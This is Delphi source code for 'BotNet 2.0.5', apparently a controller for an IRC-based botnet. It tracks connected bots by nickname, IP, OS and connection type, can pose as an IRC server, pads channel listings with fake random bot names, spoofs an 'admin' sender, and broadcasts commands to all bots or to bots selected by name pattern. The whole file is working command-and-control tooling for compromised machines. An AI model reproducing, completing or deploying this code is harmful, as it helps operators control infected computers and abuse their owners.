   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, StdCtrls, ComCtrls, ExtCtrls, jpeg, Menus, ScktComp, Winsock;

   type
     TForm1 = class(TForm)
       Panel1: TPanel;
       ListView1: TListView;
       Splitter1: TSplitter;
       RadioButton1: TRadioButton;
       RadioButton2: TRadioButton;
       ComboBox1: TComboBox;
       Edit4: TEdit;
       Button3: TButton;
       MainMenu1: TMainMenu;
       FIle1: TMenuItem;
       About1: TMenuItem;
       BotNet1: TMenuItem;
       BotPage1: TMenuItem;
       Config1: TMenuItem;
       N1: TMenuItem;
       Client1: TMenuItem;
       Server1: TMenuItem;
       N2: TMenuItem;
       Exit1: TMenuItem;
       Start1: TMenuItem;
       Stop1: TMenuItem;
       Start2: TMenuItem;
       Stop2: TMenuItem;
       StatusBar1: TStatusBar;
       Edit1: TEdit;
       Edit2: TEdit;
       Button2: TButton;
       Label1: TLabel;
       Timer1: TTimer;
       Label3: TLabel;
       Label4: TLabel;
       PageControl1: TPageControl;
       TabSheet1: TTabSheet;
       TabSheet2: TTabSheet;
       Memo1: TMemo;
       Memo3: TMemo;
       ServerSocket1: TServerSocket;
       ClientSocket1: TClientSocket;
       Timer2: TTimer;
       Panel2: TPanel;
       CheckBox1: TCheckBox;
       bGate: TCheckBox;
       Edit3: TEdit;
       Label2: TLabel;
       Memo2: TEdit;
       procedure Timer1Timer(Sender: TObject);
       procedure FormCreate(Sender: TObject);
       procedure ListView1Resize(Sender: TObject);
       procedure FormResize(Sender: TObject);
       procedure Exit1Click(Sender: TObject);
       procedure Button2Click(Sender: TObject);
       procedure ClientSocket1Error(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure ClientSocket1Connect(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ClientSocket1Connecting(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ClientSocket1Disconnect(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
       Procedure GetParams(CS: Integer; Data: String);
       Procedure AddBot(IP: String; SockId: Integer; p1,p2,p3,p4: String);
       Procedure SetNick(SockId: Integer; Nick: String);
       Procedure SetConnection(SockId: Integer; Connection: String);
       Procedure SetOS(SockId: Integer; OS: String);
       procedure ListView1Click(Sender: TObject);
       Procedure QuitBot(SockID: Integer);
       procedure ServerSocket1ClientRead(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure Start1Click(Sender: TObject);
       procedure Stop1Click(Sender: TObject);
       procedure Start2Click(Sender: TObject);
       procedure Stop2Click(Sender: TObject);
       procedure ServerSocket1ClientConnect(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ServerSocket1Listen(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ServerSocket1ClientError(Sender: TObject;
         Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
         var ErrorCode: Integer);
       procedure Config1Click(Sender: TObject);
       procedure Timer2Timer(Sender: TObject);
       Procedure DoConnection(T: Integer; Var Data: String; Param1,Param2,Param3,Param4: String);
       Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
       Function GetUserNick(SockID: Integer): String;
       procedure Button3Click(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

     TBotData = Record
       NickName: String;
       Ident: String;
       IP: String;
       Connection: String;
       OS: String;
       SockID: Integer;
     End;
     PBotData = ^TBotData;

   const
     connection_begin: string =
       ':%server_name% 001 %param1% :Welcome %param1%!%param2%@%param3%.'#10+
       ':%param1%!%param2%@%param3% JOIN :%channel%'#10;
     connection_low: string =
       ':%server_name% 353 %param1% = %channel% :%param1% '#10;
     connection_medium: string =
       ':%server_name% 353 %param1% = %channel% :%param1% %randfakes% '#10;
     connection_high: string =
       ':%server_name% 353 %param1% = %channel% :%param1% %botnicks% '#10;
     connection_end: string =
       ':botnet!botnet@botnet TOPIC %channel% :%topic%'#10+
       ':%server_name% 366 %param1% %channel% :End of /NAMES list'#10;

   var
     BotData: TBotData;
     Form1: TForm1;
     timerCount: Integer;
     tmpText : String;
     cN,sN   : Integer;
     clientP,
     serverP : Array[0..5000] of String;

     server_name:  string;  {BotNet205}
     server_chan:  string;  {#admin}
     server_host:  string;  {botnet-host.com}
     server_topic: string;  {BotNet 2.0.5 Service}

   implementation

   uses Unit2;

   {$R *.dfm}

   Function TForm1.GetUserNick(SockID: Integer): String;
   Var
     I: Integer;
     P: Pointer;
     Tmp:String;
   Begin
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       P := ListView1.Items[i].Data;
       If (PBotData(P)^.SockID = SockID) Then
         Tmp := PBotData(P)^.NickName + '!' +
                PBotData(P)^.Ident + '@' +
                PBotData(P)^.IP;
     End;
     Result := Tmp;
   End;

   Procedure TForm1.DoConnection(T: Integer; Var Data: String; Param1,Param2,Param3,Param4: String);
   Var
     B: Integer;
     C: Integer;
     N: String;
     M: String;

   Function randombots:String;
   Var
     I, J: Integer;
     Tmp : String;
     Bots: String;
     Abc : String;
   begin
     Randomize;

     Abc := 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\`^~-_/[]}{';

     J := Random(30)+20;
     I := Random(10)+5;

     Bots := '';

     While J > 0 Do
     Begin
       Tmp := '';
       While Length(Tmp) < I Do
         Tmp := Tmp + Abc[Random(Length(Abc))];
       Bots := Bots + '@'+Tmp + ' ';
       Dec(J);
     End;

     Result := Bots;
   End;

   Begin
     // 450
     Case T Of
       0:Begin
           Data := Connection_Low;
           ReplaceStr('%server_name%', server_name, Data);
           ReplaceStr('%param1%', Param1, Data);
           ReplaceStr('%param2%', Param2, Data);
           ReplaceStr('%param3%', Param3, Data);
           ReplaceStr('%param4%', Param4, Data);
           ReplaceStr('%channel%', server_chan, Data);
         End;
       1:Begin
           Data := Connection_Medium;
           ReplaceStr('%server_name%', server_name, Data);
           ReplaceStr('%param1%', Param1, Data);
           ReplaceStr('%param2%', Param2, Data);
           ReplaceStr('%param3%', Param3, Data);
           ReplaceStr('%param4%', Param4, Data);
           ReplaceStr('%channel%', server_chan, Data);
           ReplaceStr('%randfakes%', randombots, Data);
         End;
       2:Begin
           N := '';
           M := '';
           C := 0;
           For B := 0 To ListView1.Items.Count -1 Do
           Begin
             N := N + ListView1.Items[B].Caption + ' ';
             If C = 240 Then
             Begin
               C := 0;
               M := M + Connection_High;
               ReplaceStr('%server_name%', server_name, M);
               ReplaceStr('%param1%', Param1, M);
               ReplaceStr('%param2%', Param2, M);
               ReplaceStr('%param3%', Param3, M);
               ReplaceStr('%param4%', Param4, M);
               ReplaceStr('%channel%', server_chan, M);
               ReplaceStr('%botnicks% ', N, M);
               N := '';
             End;
             Inc(C);
           End;
           M := M + Connection_High;
           ReplaceStr('%server_name%', server_name, M);
           ReplaceStr('%param1%', Param1, M);
           ReplaceStr('%param2%', Param2, M);
           ReplaceStr('%param3%', Param3, M);
           ReplaceStr('%param4%', Param4, M);
           ReplaceStr('%channel%', server_chan, M);
           ReplaceStr('%botnicks% ', N, M);
           Data := M;
         End;
     End;
   End;

   Procedure TForm1.ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
   Var
     xPos: Integer;
   Begin
     While Pos(ReplaceWord, Text)>0 Do
     Begin
       xPos := Pos(ReplaceWord, Text);
       Delete(Text, xPos, length(ReplaceWord));
       Insert(WithWord, Text, xPos);
     End;
   End;

   Procedure TForm1.QuitBot(SockID: Integer);
   Var
     I: Integer;
     P: Pointer;
   Begin
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       P := ListView1.Items[i].Data;
       If PBotData(P)^.SockID = SockId Then
       Begin
         Memo1.Lines.Add('** QUIT ('+PBotData(P)^.NickName+')');
         ListView1.Items[i].Delete;
         Break;
       End;
     End;
   End;

   Procedure TForm1.SetOS(SockId: Integer; OS: String);
   Var
     I: Integer;
     P: Pointer;
   Begin
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       P := ListView1.Items[i].Data;
       If PBotData(P)^.SockID = SockId Then
       Begin
         PBotData(P)^.OS := OS;
         Break;
       End;
     End;
   End;

   Procedure TForm1.SetConnection(SockId: Integer; Connection: String);
   Var
     I: Integer;
     P: Pointer;
   Begin
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       P := ListView1.Items[i].Data;
       If PBotData(P)^.SockID = SockId Then
       Begin
         PBotData(P)^.Connection := Connection;
         Break;
       End;
     End;
   End;

   Procedure TForm1.SetNick(SockId: Integer; Nick: String);
   Var
     I: Integer;
     P: Pointer;
   Begin
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       P := ListView1.Items[i].Data;
       If PBotData(P)^.SockID = SockId Then
       Begin
         PBotData(P)^.NickName := Nick;
         ListView1.Items[i].Caption := Nick;
         Break;
       End;
     End;
   End;

   Procedure TForm1.AddBot(IP: String; SockId: Integer; p1,p2,p3,p4: String);
   Var
     Item: TListItem;
     P   : Pointer;
     I   : Integer;
   Begin
     Item := ListView1.Items.Add;
     Item.Caption := p1;
     BotData.NickName := p1;
     BotData.Ident := p2;
     BotData.SockID := SockID;
     BotData.IP := IP;
     Item.SubItems.Add('');
     Item.Data := @BotData;
     Memo1.Lines.Add('** JOIN ('+p1+')');
   End;

   Procedure TForm1.GetParams(CS: Integer; Data: String);
   Var
     Tmp: String;
   Begin
     Case CS Of
       0: cN := 0;
       1: sN := 0;
     End;

     Case CS Of
       0: ZeroMemory(@ClientP, SizeOf(ClientP));
       1: ZeroMemory(@serverP, SizeOf(serverP));
     End;

     Data := Trim(Data) + ' ';
     While Pos(' ', Data) > 0 Do
     Begin
       Case CS Of
         0: ClientP[cN] := Copy(Data, 1, Pos(' ', Data)-1);
         1: serverP[sN] := Copy(Data, 1, Pos(' ', Data)-1);
       End;
       Data := Copy(Data, Pos(' ', Data)+1, Length(Data));
       inc(cn);
       inc(sn);
     End;
   End;

   procedure TForm1.Timer1Timer(Sender: TObject);
   var
     text:string;
     i:integer;
   begin
     text := TMPTEXT;
     If Text <> '' Then
       Memo1.Text := Memo1.Text + Text[1]
     Else
       Timer1.Enabled := False;
     inc(timerCount);
     delete(tmpText,1,1);
   end;

   procedure TForm1.FormCreate(Sender: TObject);
   begin
     tmpText := 'Thanks for using BotNet 2.0.5'#13#10'Please visit http://p0ke.no-ip.com';
     timerCount := 0;
     memo1.text := '';
   end;

   procedure TForm1.ListView1Resize(Sender: TObject);
   begin
     ListView1.Column[0].Width := ListView1.Width - 60;
     ListView1.Column[1].Width := 50;
   end;

   procedure TForm1.FormResize(Sender: TObject);
   begin
     If Splitter1.Left > 50 Then
     Begin
       If Splitter1.Left > (Panel1.Width - 46) Then
         PageControl1.Width := Panel1.Width - 40;
     End;
   end;

   procedure TForm1.Exit1Click(Sender: TObject);
   begin
     ExitProcess(0);
   end;

   FUNCTION getip(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   procedure TForm1.Button2Click(Sender: TObject);
   begin
     If Button2.Caption = '&Connect' Then
     Begin
       ClientSocket1.Port := StrToInt(Edit2.Text);
       ClientSocket1.Address := getip(Edit1.Text);
       ClientSocket1.Active := True;
       Button2.Caption := '&Disconnect';
       Exit;
     End;

     If Button2.Caption = '&Disconnect' Then
     Begin
       If ClientSocket1.Active Then
       If MessageBox(0,'Are you sure you want to break your current'#13#10+
                     'connection?', 'Warning!', mb_yesno) = id_no Then
         Exit;
       Button2.Caption := '&Connect';
       ClientSocket1.Active := False;
       ListView1.Items.Clear;
       Exit;
     End;
   end;

   procedure TForm1.ClientSocket1Error(Sender: TObject;
     Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
     var ErrorCode: Integer);
   begin
     Label4.Caption := 'Client error #'+IntToStr(ErrorCode);
     Memo1.Lines.Add('## Error: #'+IntToStr(Errorcode));
     ErrorCode := 0;
     If ClientSocket1.Active = False Then
       Button2.Caption := '&Connect';
   end;

   procedure TForm1.ClientSocket1Connect(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
     Memo1.Lines.Add('## Connected To '+edit1.text+':'+edit2.text);
     Label4.Caption := 'Client connected';
     If Not bGate.Checked Then
     Begin
       Memo1.Lines.Add('## Sending USER');
       Socket.SendText('USER '+Edit3.Text+' '+Edit3.Text+'@'+Edit3.Text+' "win2k" :'+Edit3.Text+#10);
       Memo1.Lines.Add('## Sending NICK');
       Socket.SendText('NICK '+Edit3.Text+#10);
     End;
   end;

   procedure TForm1.ClientSocket1Connecting(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
     Memo1.Lines.Add('## Connecting To '+edit1.text+':'+edit2.text);
     Label4.Caption := 'Client connecting';
   end;

   procedure TForm1.ClientSocket1Disconnect(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
     Memo1.Lines.Add('## Disconnected From '+edit1.text+':'+edit2.text);
     Button2.Caption := '&Connect';
     Label4.Caption := 'Client disconnected';
   end;

   procedure TForm1.ClientSocket1Read(Sender: TObject;
     Socket: TCustomWinSocket);
   var
     data: String;
     tmp : String;
     Nick: String;
     Msg : String;
     IP  : String;
     Sock: Integer;
     I   : Integer;
   begin
     data := socket.ReceiveText;
     Label4.caption := 'Received '+inttostr(length(data))+' bytes';

     While Data <> '' Do
     Begin
       Tmp := Copy(Data, 1, Pos(#10, Data)-1);
       If Tmp[Length(Tmp)] = #13 Then Delete(Tmp, Length(Tmp), 1);

       Data := Copy(Data, Pos(#10, Data)+1, Length(Data));

       If Not bGate.Checked Then
       Begin
         GetParams(0, Tmp);

   {
         353 p0key @ #swevx :p0key NexusC e1f madman threepio CriTiX
   }

         If UpperCase(ClientP[1]) = '353' Then
         Begin
           Delete(Tmp, 1, 1);
           Tmp := Copy(Tmp, Pos(':', Tmp)+1, Length(Tmp));
           GetParams(0, Tmp);
           For i := 0 To cN -1 Do Begin
             Randomize;
             AddBot('?.?.?.?', Random(99999), ClientP[I],ClientP[I]+'_',ClientP[I]+'|',ClientP[I]+'-');
             Sleep(100);
           End;
         End;

         If pos('PING :', Tmp)> 0 Then
         Begin
           Memo1.Lines.Add('## Got Ping? Suck Pong!');
           Msg := Copy(Tmp, Pos('PING :', Tmp), Length(Tmp));
           Delete(Msg, 2, 1);
           Insert('O', Msg, 2);
           Socket.SendText(Msg+#10);
         End;

         If Pos('MOTD', Tmp) > 0 Then
         Begin
           Memo1.Lines.Add('## Found MOTD: Time To Join Chan');
           Socket.SendText('MODE '+Form2.Edit6.Text+#10);
           Socket.SendText('JOIN '+Form2.Edit6.Text+#10);
         End;

         If UpperCase(ClientP[1]) = 'PRIVMSG' Then
         Begin
           Nick := Copy(ClientP[0], 2, Pos('!', ClientP[0])-2);
           Tmp := Copy(Tmp, Pos(ClientP[2], Tmp)+Length(ClientP[2])+2, Length(Tmp));
           Memo1.Lines.Add(Nick+': '+Tmp);
         End;

       End Else Begin
         IP := Copy(Tmp, 1, Pos(' ', Tmp)-1);
         Tmp := Copy(Tmp, pos(' ', Tmp)+1, Length(Tmp));
         SOCK := StrToInt(Copy(Tmp, 1, Pos(' ', Tmp)-1));
         Tmp := Copy(Tmp, pos(' ', Tmp)+1, Length(Tmp));

         getparams(0, tmp);

         If UpperCase(ClientP[0]) = 'QUIT' Then QuitBot(Sock);
         If UpperCase(ClientP[0]) = 'NICK' Then SetNick(Sock, ClientP[1]);
         If UpperCase(ClientP[0]) = 'USER' Then AddBot(IP, Sock, ClientP[1],
                                                     ClientP[2], ClientP[3], ClientP[4]);
         If UpperCase(ClientP[0]) = 'CONNECTION' Then SetConnection(Sock, ClientP[1]);
         If UpperCase(ClientP[0]) = 'OSTYPE' Then SetOS(Sock, ClientP[1]);
         If UpperCase(ClientP[1]) = 'PRIVMSG' Then
         Begin
           Nick := ClientP[0];
           Nick := Copy(Nick, 1, Pos('!', Nick)-1);
           Msg := Copy(Tmp, Pos(' :', Tmp)+2, Length(Tmp));
           Memo1.Lines.Add(Nick+': '+Msg);
         End;
       End;

     End;

   end;

   procedure TForm1.ListView1Click(Sender: TObject);
   Var
     p: Pointer;
     i: Integer;
   begin
     Memo3.Clear;
     If ListView1.ItemIndex = -1 Then Exit;

     Memo3.Lines.Add('Looking up '+ListView1.ItemFocused.Caption+'...');
     memo3.lines.add('');
     memo3.lines.add('');

     P := ListView1.ItemFocused.Data;

     memo3.lines.add('Nickname: '+ PBotData(P)^.NickName);
     memo3.lines.add('Ident: '+ PBotData(P)^.Ident);
     memo3.lines.add('IP Address: '+ PBotData(P)^.IP);
     memo3.lines.add('OS Type: '+ PBotData(P)^.OS);
     memo3.lines.add('Connection: '+ PBotData(P)^.Connection);
     memo3.lines.add('SocketID: '+ IntToStr(PBotData(P)^.SockID));
     memo3.lines.add('');
     memo3.lines.add('End of info.');
   end;

   procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
     Socket: TCustomWinSocket);
   var
     data: String;
     tmp : String;
     Nick: String;
     Msg : String;
     IP  : String;
     Sock: Integer;
   begin
     data := socket.ReceiveText;
     Label4.caption := 'Received '+inttostr(length(data))+' bytes';

     While Data <> '' Do
     Begin
       Tmp := Copy(Data, 1, Pos(#10, Data)-1);
       If Tmp[Length(Tmp)] = #13 Then Delete(Tmp, Length(Tmp), 1);

       Data := Copy(Data, Pos(#10, Data)+1, Length(Data));

       IP := Socket.RemoteAddress;
       SOCK := Socket.SocketHandle;

       getparams(1, tmp);

       If UpperCase(ServerP[0]) = 'QUIT' Then QuitBot(Sock);
       If UpperCase(ServerP[0]) = 'NICK' Then SetNick(Sock, ServerP[1]);
       If UpperCase(ServerP[0]) = 'USER' Then
       Begin
         tmp := connection_begin;
         replacestr('%server_name%', server_name, tmp);
         replacestr('%param1%', ServerP[1], tmp);
         replacestr('%param2%', ServerP[2], tmp);
         replacestr('%param3%', ServerP[3], tmp);
         replacestr('%param4%', ServerP[4], tmp);
         replacestr('%channel%', server_chan, tmp);
         ReplaceStr('"', '', Tmp);
         Socket.SendText(tmp);
         with form2 do
         begin
           case radiogroup1.ItemIndex of
             0:DoConnection(0, Tmp, ServerP[1], ServerP[2], ServerP[3], ServerP[4]);
             1:DoConnection(1, Tmp, ServerP[1], ServerP[2], ServerP[3], ServerP[4]);
             2:DoConnection(2, Tmp, ServerP[1], ServerP[2], ServerP[3], ServerP[4]);
           end;
         end;
         Socket.SendText(Tmp);
         Tmp := connection_end;
         ReplaceStr('%server_name%', server_name, Tmp);
         ReplaceStr('%param1%', ServerP[1], Tmp);
         ReplaceStr('%channel%', server_chan, Tmp);
         ReplaceStr('%topic%', server_topic, Tmp);
         Socket.SendText(Tmp);
         If Form2.CheckBox3.Checked Then
           AddBot(Form2.Edit4.Text, Sock, ServerP[1], ServerP[2], ServerP[3], ServerP[4])
         Else
           AddBot(IP, Sock, ServerP[1], ServerP[2], ServerP[3], ServerP[4]);
       End;
       If UpperCase(ServerP[0]) = 'CONNECTION' Then SetConnection(Sock, ServerP[1]);
       If UpperCase(ServerP[0]) = 'OSTYPE' Then SetOS(Sock, ServerP[1]);
       If UpperCase(ServerP[0]) = 'PRIVMSG' Then
       Begin
         Tmp := GetUserNick(Socket.SocketHandle) + Tmp;
         getparams(1, tmp);
         Nick := ServerP[0];
         Nick := Copy(Nick, 1, Pos('!', Nick)-1);
         Msg := Copy(Tmp, Pos(' :', Tmp)+2, Length(Tmp));
         Memo1.Lines.Add(Nick+': '+Msg);
       End;

     End;
   end;

   procedure TForm1.Start1Click(Sender: TObject);
   begin
     if button2.caption = '&Connect' Then Button2.click;
   end;

   procedure TForm1.Stop1Click(Sender: TObject);
   begin
     if button2.caption = '&Disconnect' Then Button2.click;
   end;

   procedure TForm1.Start2Click(Sender: TObject);
   begin
     If ServerSocket1.Active Then Exit;
     If ClientSocket1.Active Then
       If MessageBox(0,'Are you sure you want to break your current connection?', 'Warning', mb_yesno) = ID_NO Then Exit;
     Button2.Enabled := False;
     ServerSocket1.Active := True;
   end;

   procedure TForm1.Stop2Click(Sender: TObject);
   begin
     If Not ServerSocket1.Active Then Exit;
     Button2.Enabled := True;
     ServerSocket1.Active := False;
   end;

   procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
     Label4.Caption := 'Server accepted connection';
     Memo1.Lines.Add('## '+Socket.LocalAddress +' Connected');
   end;

   procedure TForm1.ServerSocket1Listen(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
     Label4.Caption := 'Server online';
     Memo1.Lines.Add('## Server online');
   end;

   procedure TForm1.ServerSocket1ClientError(Sender: TObject;
     Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
     var ErrorCode: Integer);
   begin
     Label4.Caption := 'Server error #'+IntToStr(ErrorCode);
     Memo1.Lines.Add('## Server error #'+IntToStr(ErrorCode));
     ErrorCode:=0;
   end;

   procedure TForm1.Config1Click(Sender: TObject);
   begin
     Form2.Show;
   end;

   procedure TForm1.Timer2Timer(Sender: TObject);
   begin
     Timer2.Enabled := False;
     form2.loadsettings('default.bn5');
     With Form2 Do
     Begin
       server_name := Edit3.Text;
       server_host := Edit4.Text;
       server_topic:= Edit5.Text;
       server_chan := Edit6.Text;
     End;
   end;

   procedure TForm1.Button3Click(Sender: TObject);
   var
     I: Integer;
     J: Integer;
     P: Pointer;
   begin
     If RadioButton1.Checked Then
     Begin
       If Form2.CheckBox1.Checked Then
         Memo1.Lines.Add(Copy(Form2.Edit2.Text,1,pos('!',Form2.Edit2.Text)-1)+': '+Memo2.Text)
       Else
         Memo1.Lines.Add('You: '+Memo2.Text);
       If CheckBox1.Checked Then
       Begin
         If ServerSocket1.Active Then
           For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
             ServerSocket1.Socket.Connections[i].SendText(memo2.Text+#10);
         If ClientSocket1.Active Then
           ClientSocket1.Socket.SendText(memo2.text+#10);
       End Else
       Begin
         If ServerSocket1.Active Then
           For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
             If Form2.CheckBox1.Checked Then
               ServerSocket1.Socket.Connections[i].SendText(
               ':'+Form2.Edit2.Text + ' PRIVMSG '+Form2.Edit6.Text+' :'+memo2.Text+#10)
             Else
               ServerSocket1.Socket.Connections[i].SendText(
               ':admin!admin@127.0.0.1 PRIVMSG '+Form2.Edit6.Text+' :'+memo2.Text+#10);
         If ClientSocket1.Active Then
           If Form2.CheckBox1.Checked Then
             ClientSocket1.Socket.SendText('PRIVMSG '+Form2.Edit6.Text+' :'+memo2.Text+#10)
           Else
             ClientSocket1.Socket.SendText('PRIVMSG '+Form2.Edit6.Text+' :'+memo2.Text+#10);
       End;
     End Else
     Begin
       Case ComboBox1.ItemIndex Of
         0:Begin
             // Selected Bots Only.
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If ListView1.Items[i].Selected Then
                 If ServerSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   For J := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
                   Begin
                     If ServerSocket1.Socket.Connections[i].SocketHandle = PBotData(P)^.SockID Then
                       If Form2.CheckBox1.Checked Then
                         ServerSocket1.Socket.Connections[i].SendText(':'+Form2.Edit2.Text + ' PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10)
                       Else
                         ServerSocket1.Socket.Connections[i].SendText(':admin!admin@127.0.0.1 PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10);
                   End;
                 End;
                 If ClientSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   If Form2.CheckBox1.Checked Then
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10)
                   Else
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10);
                 End;
             End;
           End;
         1:Begin
             // Bots Start With
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If Copy(ListView1.Items[i].Caption, 1, Length(Edit4.Text)) = Edit4.Text Then
                 If ServerSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   For J := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
                   Begin
                     If ServerSocket1.Socket.Connections[i].SocketHandle = PBotData(P)^.SockID Then
                       If Form2.CheckBox1.Checked Then
                         ServerSocket1.Socket.Connections[i].SendText(':'+Form2.Edit2.Text + ' PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10)
                       Else
                         ServerSocket1.Socket.Connections[i].SendText(':admin!admin@127.0.0.1 PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10);
                   End;
                 End;
                 If ClientSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   If Form2.CheckBox1.Checked Then
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10)
                   Else
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10);
                 End;
             End;
           End;
         2:Begin
             // Bots Contain
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If Pos(Edit4.Text, ListView1.Items[i].Caption) > 0 Then
                 If ServerSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   For J := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
                   Begin
                     If ServerSocket1.Socket.Connections[i].SocketHandle = PBotData(P)^.SockID Then
                       If Form2.CheckBox1.Checked Then
                         ServerSocket1.Socket.Connections[i].SendText(':'+Form2.Edit2.Text + ' PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10)
                       Else
                         ServerSocket1.Socket.Connections[i].SendText(':admin!admin@127.0.0.1 PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10);
                   End;
                 End;
                 If ClientSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   If Form2.CheckBox1.Checked Then
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10)
                   Else
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10);
                 End;
             End;
           End;
         3:Begin
             // Bots Ends With
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If Copy(ListView1.Items[i].Caption, Length(ListView1.Items[i].Caption)-Length(Edit4.Text), Length(Edit4.Text)) = Edit4.Text Then
                 If ServerSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   For J := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
                   Begin
                     If ServerSocket1.Socket.Connections[i].SocketHandle = PBotData(P)^.SockID Then
                       If Form2.CheckBox1.Checked Then
                         ServerSocket1.Socket.Connections[i].SendText(':'+Form2.Edit2.Text + ' PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10)
                       Else
                         ServerSocket1.Socket.Connections[i].SendText(':admin!admin@127.0.0.1 PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10);
                   End;
                 End;
                 If ClientSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   If Form2.CheckBox1.Checked Then
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10)
                   Else
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10);
                 End;
             End;
           End;
       End;
     End;
     Memo2.Text := '';
   end;

   end.
